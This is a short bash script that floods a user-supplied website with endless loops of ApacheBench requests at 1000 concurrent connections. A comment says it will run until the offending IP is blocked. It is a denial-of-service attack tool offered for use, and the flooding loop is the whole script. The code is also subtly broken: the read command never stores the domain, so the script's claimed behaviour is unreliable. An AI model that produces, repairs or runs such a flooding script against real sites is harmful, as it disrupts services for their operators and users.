#!/bin/bash
#This script will create an enormous amount of traffic to a specified website until the offending IP is blocked or until the script is stopped.
#If you have trouble killing the script the send it to the backgrund with ctrl+z and kill the paused job with 'kill %1' (substitute 1 with the job ID).
echo "What is the target domain?"
read -p "> " $DOMAIN
while true
    do ab -c1000 -n1000 http://$DOMAIN
done
